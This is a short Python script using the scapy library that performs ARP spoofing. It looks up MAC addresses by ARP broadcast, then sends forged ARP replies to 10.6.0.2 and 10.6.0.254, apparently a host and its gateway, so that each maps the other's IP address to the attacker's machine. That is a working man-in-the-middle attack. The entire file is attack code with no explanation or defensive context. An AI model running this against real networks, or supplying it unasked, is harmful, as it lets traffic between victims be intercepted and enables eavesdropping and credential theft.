import scapy.all as scapy


def get_mac(ip: str):
    ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                    scapy.ARP(pdst=ip), timeout=2, verbose=False)[0]
    return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


spoof('10.6.0.2', '10.6.0.254')
spoof('10.6.0.254', '10.6.0.2')
